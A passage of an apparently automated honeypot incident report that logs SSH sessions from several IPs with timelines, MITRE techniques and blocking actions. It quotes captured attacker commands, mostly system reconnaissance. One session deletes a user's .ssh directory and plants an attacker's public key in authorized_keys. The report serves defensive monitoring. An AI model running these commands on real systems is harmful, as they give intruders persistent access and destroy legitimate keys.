| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 17:45:13` | `cowrie.session.connect` |
| `2026-07-01 17:45:13` | `cowrie.client.version` |
| `2026-07-01 17:45:14` | `cowrie.client.kex` |
| `2026-07-01 17:45:15` | `cowrie.login.success` |
| `2026-07-01 17:45:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.187.147[.]214` to AbuseIPDB if not already reported
- [ ] Block `103.187.147[.]214` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-26bbb4e31d1e

| Field | Detail |
|---|---|
| **Source IP** | `103.187.147[.]214` |
| **First Seen** | 2026-07-01 17:45 |
| **Last Seen** | 2026-07-01 17:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 17:45:15` | `cowrie.session.connect` |
| `2026-07-01 17:45:15` | `cowrie.client.version` |
| `2026-07-01 17:45:15` | `cowrie.client.kex` |
| `2026-07-01 17:45:16` | `cowrie.login.success` |
| `2026-07-01 17:45:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.187.147[.]214` to AbuseIPDB if not already reported
- [ ] Block `103.187.147[.]214` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4c24d6f3c2e5

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-07-01 17:47 |
| **Last Seen** | 2026-07-01 17:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 17:47:19` | `cowrie.session.connect` |
| `2026-07-01 17:47:19` | `cowrie.client.version` |
| `2026-07-01 17:47:19` | `cowrie.client.kex` |
| `2026-07-01 17:47:19` | `cowrie.login.success` |
| `2026-07-01 17:47:20` | `cowrie.session.params` |
| `2026-07-01 17:47:20` | `cowrie.command.input` |
| `2026-07-01 17:47:20` | `cowrie.command.input` |
| `2026-07-01 17:47:20` | `cowrie.command.input` |
| `2026-07-01 17:47:20` | `cowrie.command.input` |
| `2026-07-01 17:47:20` | `cowrie.command.input` |
| `2026-07-01 17:47:20` | `cowrie.command.success` |
| `2026-07-01 17:47:20` | `cowrie.command.input` |
| `2026-07-01 17:47:20` | `cowrie.command.input` |
| `2026-07-01 17:47:20` | `cowrie.command.input` |
| `2026-07-01 17:47:20` | `cowrie.command.input` |
| `2026-07-01 17:47:20` | `cowrie.log.closed` |
| `2026-07-01 17:47:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-98910296892d

| Field | Detail |
|---|---|
| **Source IP** | `174.35.25[.]178` |
| **First Seen** | 2026-07-01 17:47 |
| **Last Seen** | 2026-07-01 17:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 17:47:22` | `cowrie.session.connect` |
| `2026-07-01 17:47:22` | `cowrie.client.version` |
| `2026-07-01 17:47:22` | `cowrie.client.kex` |
| `2026-07-01 17:47:23` | `cowrie.login.success` |
| `2026-07-01 17:47:23` | `cowrie.session.params` |
| `2026-07-01 17:47:23` | `cowrie.command.input` |
| `2026-07-01 17:47:23` | `cowrie.command.failed` |
| `2026-07-01 17:47:23` | `cowrie.log.closed` |
| `2026-07-01 17:47:24` | `cowrie.session.params` |
| `2026-07-01 17:47:24` | `cowrie.command.input` |
| `2026-07-01 17:47:24` | `cowrie.session.file_download` |
| `2026-07-01 17:47:24` | `cowrie.log.closed` |
| `2026-07-01 17:47:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `174.35.25[.]178` to AbuseIPDB if not already reported
- [ ] Block `174.35.25[.]178` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-54689ed56805

| Field | Detail |
|---|---|
| **Source IP** | `174.35.25[.]178` |
| **First Seen** | 2026-07-01 17:47 |
| **Last Seen** | 2026-07-01 17:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 17:47:24` | `cowrie.session.connect` |
| `2026-07-01 17:47:24` | `cowrie.client.version` |
| `2026-07-01 17:47:24` | `cowrie.client.kex` |
| `2026-07-01 17:47:24` | `cowrie.login.success` |
| `2026-07-01 17:47:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `174.35.25[.]178` to AbuseIPDB if not already reported
- [ ] Block `174.35.25[.]178` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9559fed179da

| Field | Detail |
|---|---|
| **Source IP** | `174.35.25[.]178` |
| **First Seen** | 2026-07-01 17:47 |
| **Last Seen** | 2026-07-01 17:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 17:47:24` | `cowrie.session.connect` |
| `2026-07-01 17:47:24` | `cowrie.client.version` |
| `2026-07-01 17:47:24` | `cowrie.client.kex` |
| `2026-07-01 17:47:24` | `cowrie.login.success` |
| `2026-07-01 17:47:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `174.35.25[.]178` to AbuseIPDB if not already reported
- [ ] Block `174.35.25[.]178` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-63c4f0536bec

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]240` |
| **First Seen** | 2026-07-01 17:48 |
| **Last Seen** | 2026-07-01 17:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 17:48:53` | `cowrie.session.connect` |
| `2026-07-01 17:48:53` | `cowrie.client.version` |
| `2026-07-01 17:48:53` | `cowrie.client.kex` |
| `2026-07-01 17:48:53` | `cowrie.login.success` |
| `2026-07-01 17:48:54` | `cowrie.session.params` |
| `2026-07-01 17:48:54` | `cowrie.command.input` |
| `2026-07-01 17:48:54` | `cowrie.command.input` |
| `2026-07-01 17:48:54` | `cowrie.command.input` |
| `2026-07-01 17:48:54` | `cowrie.command.input` |
| `2026-07-01 17:48:54` | `cowrie.command.input` |
| `2026-07-01 17:48:54` | `cowrie.command.success` |
| `2026-07-01 17:48:54` | `cowrie.command.input` |
| `2026-07-01 17:48:54` | `cowrie.command.input` |
| `2026-07-01 17:48:54` | `cowrie.command.input` |
| `2026-07-01 17:48:54` | `cowrie.command.input` |
| `2026-07-01 17:48:54` | `cowrie.log.closed` |
| `2026-07-01 17:48:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]240` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd3e0c52c6d8

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-07-01 17:51 |
| **Last Seen** | 2026-07-01 17:51 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 17:51:53` | `cowrie.session.connect` |
| `2026-07-01 17:51:53` | `cowrie.client.version` |
| `2026-07-01 17:51:53` | `cowrie.client.kex` |
| `2026-07-01 17:51:55` | `cowrie.login.success` |
| `2026-07-01 17:51:58` | `cowrie.session.params` |
| `2026-07-01 17:51:58` | `cowrie.command.input` |
| `2026-07-01 17:51:58` | `cowrie.log.closed` |
| `2026-07-01 17:51:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3ad6b5a6499b

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-07-01 17:53 |
| **Last Seen** | 2026-07-01 17:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 17:53:26` | `cowrie.session.connect` |
| `2026-07-01 17:53:26` | `cowrie.client.version` |
| `2026-07-01 17:53:26` | `cowrie.client.kex` |
| `2026-07-01 17:53:26` | `cowrie.login.success` |
| `2026-07-01 17:53:27` | `cowrie.session.params` |
| `2026-07-01 17:53:27` | `cowrie.command.input` |
| `2026-07-01 17:53:27` | `cowrie.command.input` |
| `2026-07-01 17:53:27` | `cowrie.command.input` |
| `2026-07-01 17:53:27` | `cowrie.command.input` |
| `2026-07-01 17:53:27` | `cowrie.command.input` |
| `2026-07-01 17:53:27` | `cowrie.command.success` |
| `2026-07-01 17:53:27` | `cowrie.command.input` |
| `2026-07-01 17:53:27` | `cowrie.command.input` |
| `2026-07-01 17:53:27` | `cowrie.command.input` |
| `2026-07-01 17:53:27` | `cowrie.command.input` |
| `2026-07-01 17:53:27` | `cowrie.log.closed` |
| `2026-07-01 17:53:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-07b7080f84aa

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-01 17:54 |
| **Last Seen** | 2026-07-01 17:55 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 17:54:49` | `cowrie.session.connect` |
| `2026-07-01 17:54:51` | `cowrie.client.version` |
| `2026-07-01 17:54:51` | `cowrie.client.kex` |
| `2026-07-01 17:54:57` | `cowrie.login.success` |
| `2026-07-01 17:55:01` | `cowrie.session.params` |
| `2026-07-01 17:55:01` | `cowrie.command.input` |
| `2026-07-01 17:55:03` | `cowrie.log.closed` |
| `2026-07-01 17:55:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b3f7e0e4fe1

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]240` |
| **First Seen** | 2026-07-01 17:55 |
| **Last Seen** | 2026-07-01 17:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 17:55:37` | `cowrie.session.connect` |
| `2026-07-01 17:55:37` | `cowrie.client.version` |
| `2026-07-01 17:55:37` | `cowrie.client.kex` |
| `2026-07-01 17:55:37` | `cowrie.login.success` |
| `2026-07-01 17:55:38` | `cowrie.session.params` |
| `2026-07-01 17:55:38` | `cowrie.command.input` |
| `2026-07-01 17:55:38` | `cowrie.command.input` |
| `2026-07-01 17:55:38` | `cowrie.command.input` |
| `2026-07-01 17:55:38` | `cowrie.command.input` |
| `2026-07-01 17:55:38` | `cowrie.command.input` |
| `2026-07-01 17:55:38` | `cowrie.command.success` |
| `2026-07-01 17:55:38` | `cowrie.command.input` |
| `2026-07-01 17:55:38` | `cowrie.command.input` |
| `2026-07-01 17:55:38` | `cowrie.command.input` |
| `2026-07-01 17:55:38` | `cowrie.command.input` |
| `2026-07-01 17:55:38` | `cowrie.log.closed` |
| `2026-07-01 17:55:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]240` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2441bbbf4b7c

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-07-01 17:59 |
| **Last Seen** | 2026-07-01 17:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 17:59:50` | `cowrie.session.connect` |
| `2026-07-01 17:59:50` | `cowrie.client.version` |
| `2026-07-01 17:59:50` | `cowrie.client.kex` |
| `2026-07-01 17:59:51` | `cowrie.login.success` |
| `2026-07-01 17:59:51` | `cowrie.session.params` |
| `2026-07-01 17:59:51` | `cowrie.command.input` |
| `2026-07-01 17:59:51` | `cowrie.command.input` |
| `2026-07-01 17:59:51` | `cowrie.command.input` |
| `2026-07-01 17:59:51` | `cowrie.command.input` |
| `2026-07-01 17:59:51` | `cowrie.command.input` |
| `2026-07-01 17:59:51` | `cowrie.command.success` |
| `2026-07-01 17:59:51` | `cowrie.command.input` |
| `2026-07-01 17:59:51` | `cowrie.command.input` |
| `2026-07-01 17:59:51` | `cowrie.command.input` |
| `2026-07-01 17:59:51` | `cowrie.command.input` |
| `2026-07-01 17:59:51` | `cowrie.log.closed` |
| `2026-07-01 17:59:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1a45938b612f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]240` |
| **First Seen** | 2026-07-01 18:01 |
| **Last Seen** | 2026-07-01 18:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 18:01:50` | `cowrie.session.connect` |
| `2026-07-01 18:01:50` | `cowrie.client.version` |
| `2026-07-01 18:01:50` | `cowrie.client.kex` |
| `2026-07-01 18:01:51` | `cowrie.login.success` |
| `2026-07-01 18:01:52` | `cowrie.session.params` |
| `2026-07-01 18:01:52` | `cowrie.command.input` |
| `2026-07-01 18:01:52` | `cowrie.command.input` |
| `2026-07-01 18:01:52` | `cowrie.command.input` |
| `2026-07-01 18:01:52` | `cowrie.command.input` |
| `2026-07-01 18:01:52` | `cowrie.command.input` |
| `2026-07-01 18:01:52` | `cowrie.command.success` |
| `2026-07-01 18:01:52` | `cowrie.command.input` |
| `2026-07-01 18:01:52` | `cowrie.command.input` |
| `2026-07-01 18:01:52` | `cowrie.command.input` |
| `2026-07-01 18:01:52` | `cowrie.command.input` |
| `2026-07-01 18:01:52` | `cowrie.log.closed` |
| `2026-07-01 18:01:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]240` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-44c07b0a0c7f

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-01 18:03 |
| **Last Seen** | 2026-07-01 18:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 18:03:10` | `cowrie.session.connect` |
| `2026-07-01 18:03:10` | `cowrie.client.version` |
| `2026-07-01 18:03:10` | `cowrie.client.kex` |
| `2026-07-01 18:03:11` | `cowrie.login.success` |
| `2026-07-01 18:03:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-370001b60f8a

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-01 18:03 |
| **Last Seen** | 2026-07-01 18:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 18:03:10` | `cowrie.session.connect` |
| `2026-07-01 18:03:10` | `cowrie.client.version` |
| `2026-07-01 18:03:10` | `cowrie.client.kex` |
| `2026-07-01 18:03:11` | `cowrie.login.success` |
| `2026-07-01 18:03:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7ec9f2bd1b09

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-01 18:03 |
| **Last Seen** | 2026-07-01 18:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 18:03:21` | `cowrie.session.connect` |
| `2026-07-01 18:03:21` | `cowrie.client.version` |
| `2026-07-01 18:03:21` | `cowrie.client.kex` |
| `2026-07-01 18:03:21` | `cowrie.login.success` |
| `2026-07-01 18:03:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e5e39e33cd23

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-01 18:03 |
| **Last Seen** | 2026-07-01 18:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 18:03:22` | `cowrie.session.connect` |
| `2026-07-01 18:03:22` | `cowrie.client.version` |
| `2026-07-01 18:03:22` | `cowrie.client.kex` |
| `2026-07-01 18:03:22` | `cowrie.login.success` |
| `2026-07-01 18:03:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-72aff125c103

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-01 18:06 |
| **Last Seen** | 2026-07-01 18:07 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 18:06:47` | `cowrie.session.connect` |
| `2026-07-01 18:06:48` | `cowrie.client.version` |
| `2026-07-01 18:06:48` | `cowrie.client.kex` |
| `2026-07-01 18:06:55` | `cowrie.login.success` |
| `2026-07-01 18:06:59` | `cowrie.session.params` |
| `2026-07-01 18:06:59` | `cowrie.command.input` |
| `2026-07-01 18:07:00` | `cowrie.log.closed` |
| `2026-07-01 18:07:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aff1dd8c2cb2

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-01 18:07 |
| **Last Seen** | 2026-07-01 18:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 18:07:28` | `cowrie.session.connect` |
| `2026-07-01 18:07:28` | `cowrie.client.version` |
| `2026-07-01 18:07:28` | `cowrie.client.kex` |
| `2026-07-01 18:07:28` | `cowrie.login.success` |
| `2026-07-01 18:07:29` | `cowrie.session.params` |
| `2026-07-01 18:07:29` | `cowrie.command.input` |
| `2026-07-01 18:07:29` | `cowrie.log.closed` |
| `2026-07-01 18:07:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ff6249ffc951

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]240` |
| **First Seen** | 2026-07-01 18:08 |
| **Last Seen** | 2026-07-01 18:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
